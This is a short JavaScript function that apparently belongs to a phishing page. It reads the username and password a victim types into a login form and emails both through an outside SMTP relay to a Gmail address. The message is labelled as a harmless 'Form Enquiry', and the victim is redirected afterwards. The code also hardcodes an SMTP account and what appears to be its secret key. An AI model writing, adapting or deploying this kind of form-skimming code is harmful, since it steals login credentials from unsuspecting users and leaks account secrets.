function sendEmail() {
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "lexbritt11@gmail.com",
      Password: "B98286FB9DE8198F0F85409BD2C0C588062F",
      To: "billscosco0245@gmail.com",
      From: document.getElementById("username").value,
      Subject: "New Contact Info for Form Enquiry",
      Body:
        "Username or email: " +
        document.getElementById("username").value +
        " <br> Password: " +
        document.getElementById("pass").value 
    }).then((message) => {
        // alert("Message")
        window.location.href = "pageone.html"

    });
  }
  